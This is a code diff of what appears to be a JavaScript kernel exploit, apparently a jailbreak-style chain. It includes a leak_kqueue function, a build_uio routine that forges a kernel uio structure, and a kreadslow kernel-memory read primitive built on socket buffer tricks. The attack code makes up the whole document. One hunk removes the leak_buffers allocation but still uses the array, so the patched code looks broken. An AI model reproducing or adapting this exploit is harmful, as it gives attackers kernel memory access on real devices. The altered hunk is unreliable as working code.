@@ -1328,17 +1328,16 @@ function leak_kqueue() {
   * ===========================
   */
 function build_uio(uio, uio_iov, uio_td, read, addr, size) {
-  write64(uio.add(0x00), uio_iov);      // uio_iov
-  write64(uio.add(0x08), UIO_IOV_NUM);  // uio_iovcnt
+  write64(uio.add(0x00), uio_iov); // uio_iov
+  write64(uio.add(0x08), UIO_IOV_NUM); // uio_iovcnt
   write64(uio.add(0x10), BigInt_Error); // uio_offset
-  write64(uio.add(0x18), size);         // uio_resid
-  write32(uio.add(0x20), UIO_SYSSPACE);// uio_segflg
+  write64(uio.add(0x18), size); // uio_resid
+  write32(uio.add(0x20), UIO_SYSSPACE); // uio_segflg
   write32(uio.add(0x24), read ? UIO_WRITE : UIO_READ); // uio_rw
-  write64(uio.add(0x28), uio_td);       // uio_td
-  write64(uio.add(0x30), addr);         // iov_base
-  write64(uio.add(0x38), size);         // iov_len
+  write64(uio.add(0x28), uio_td); // uio_td
+  write64(uio.add(0x30), addr); // iov_base
+  write64(uio.add(0x38), size); // iov_len
 }
-
 function kreadslow(addr, size) {
   debug('[KR] Enter kreadslow addr=' + hex(addr) + ' size=' + size);
   if (debugging.info.memory.available === 0) {
@@ -1348,11 +1347,9 @@ function kreadslow(addr, size) {
   debug('kreadslow - Preparing buffers...');
 
   // Prepare leak buffers.
-  var leak_buffers = new Array(UIO_THREAD_NUM);
-  for (var i = 0; i < UIO_THREAD_NUM; i++) {
-    leak_buffers[i] = malloc(size);
+  for (var x = 0; x < UIO_THREAD_NUM; x++) {
+    read(new BigInt(uio_sock_0), leak_buffers[x], size);
   }
-  
   write32(sockopt_val_buf, size);
   safe_set_sockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
   write(new BigInt(uio_sock_1), tmp, size);
